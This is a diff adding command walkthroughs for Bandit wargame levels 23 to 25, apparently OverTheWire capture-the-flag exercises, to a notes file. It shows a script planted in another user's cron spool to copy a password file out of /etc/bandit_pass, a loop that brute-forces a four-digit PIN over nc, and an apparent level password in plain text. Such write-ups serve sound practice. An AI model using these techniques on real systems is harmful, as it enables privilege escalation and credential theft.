@@ -174,5 +174,28 @@ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 ## Level 23
 
 ```bash
+cat /etc/cron.d/cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+```
 
+## Level 24
+
+```bash
+cd /tmp
+nano task.sh
+---
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/test
+---
+cp task.sh /var/spool/bandit24/foo
+cat test
+```
+
+## Level 25
+
+```bash
+for i in {0000..9999}; do echo hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i >> pins; done && cat pins | nc localhost 30002
 ```
